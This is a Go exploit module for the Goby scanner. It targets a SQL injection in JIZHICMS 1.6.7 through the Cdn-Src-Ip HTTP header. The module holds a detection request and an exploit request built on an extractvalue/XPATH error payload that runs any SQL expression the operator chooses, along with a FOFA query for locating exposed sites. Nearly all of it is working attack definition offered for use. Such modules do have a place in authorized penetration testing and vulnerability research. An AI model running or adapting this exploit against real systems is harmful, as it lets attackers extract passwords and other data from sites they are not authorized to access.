package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "JIZHICMS Cdn-Src-Ip SQL",
    "Description": "<p>JIZHICMS CMS is a set of open source content management system (CMS) of China Extreme Network Technology Company.</p><p>JIZHICMS CMS version 1.6.7 has a security vulnerability, which originates from a SQL injection vulnerability in the CDN-SRC-IP parameter of FrPHP\\common\\ Functions.php, and attackers can obtain sensitive information such as passwords.</p>",
    "Product": "JIZHICMS",
    "Homepage": "https://github.com/Cherry-toto/jizhicms",
    "DisclosureDate": "2022-08-28",
    "Author": "abszse",
    "FofaQuery": "body=\"/layui/layui.js\\\"></script>\" && body=\"<script src=\\\"/static/\" && (banner=\"Set-Cookie: PHPSESSID=\" || header=\"Set-Cookie: PHPSESSID=\")",
    "GobyQuery": "body=\"/layui/layui.js\\\"></script>\" && body=\"<script src=\\\"/static/\" && (banner=\"Set-Cookie: PHPSESSID=\" || header=\"Set-Cookie: PHPSESSID=\")",
    "Level": "2",
    "Impact": "<p>JIZHICMS CMS version 1.6.7 has a security vulnerability, which originates from a SQL injection vulnerability in the CDN-SRC-IP parameter of FrPHP\\common\\ Functions.php, and attackers can obtain sensitive information such as passwords.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"https://github.com/Cherry-toto/jizhicms\">https://github.com/Cherry-toto/jizhicms</a></p>",
    "References": [
        "https://github.com/Cherry-toto/jizhicms"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/message/index.html",
                "follow_redirect": false,
                "header": {
                    "Cdn-Src-Ip": "2'and extractvalue(1,concat(0x5c,(select md5(332)),0x5c)) and '1'='1",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "tid=4&user=1&title=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "c042f4db68f23406c6cecf84a7ebb0f",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/message/index.html",
                "follow_redirect": false,
                "header": {
                    "Cdn-Src-Ip": "2'and extractvalue(1,concat(0x5c,(select {{{cmd}}}),0x5c)) and '1'='1",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "tid=4&user=1&title=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "极致CMS Cdn-Src-Ip SQL注入漏洞",
            "Product": "极致CMS",
            "Description": "<p>极致CMS是中国极致网络科技公司的一套开源的内容管理系统（CMS）。<br></p><p>极致CMS1.6.7 版本存在安全漏洞，该漏洞源于FrPHP\\common\\ Functions.php 的CDN-SRC-IP 参数存在SQL注入漏洞，攻击者可获取密码等敏感信息。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href=\"https://github.com/Cherry-toto/jizhicms\">https://github.com/Cherry-toto/jizhicms</a><br></p>",
            "Impact": "<p>极致CMS1.6.7 版本存在安全漏洞，该漏洞源于FrPHP\\common\\ Functions.php 的CDN-SRC-IP 参数存在SQL注入漏洞，攻击者可获取密码等敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "JIZHICMS Cdn-Src-Ip SQL",
            "Product": "JIZHICMS",
            "Description": "<p>JIZHICMS CMS is a set of open source content management system (CMS) of China Extreme Network Technology Company.<br></p><p>JIZHICMS CMS version 1.6.7 has a security vulnerability, which originates from a SQL injection vulnerability in the CDN-SRC-IP parameter of FrPHP\\common\\ Functions.php, and attackers can obtain sensitive information such as passwords.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"https://github.com/Cherry-toto/jizhicms\">https://github.com/Cherry-toto/jizhicms</a><br></p>",
            "Impact": "<p>JIZHICMS CMS version 1.6.7 has a security vulnerability, which originates from a SQL injection vulnerability in the CDN-SRC-IP parameter of FrPHP\\common\\ Functions.php, and attackers can obtain sensitive information such as passwords.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10701"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}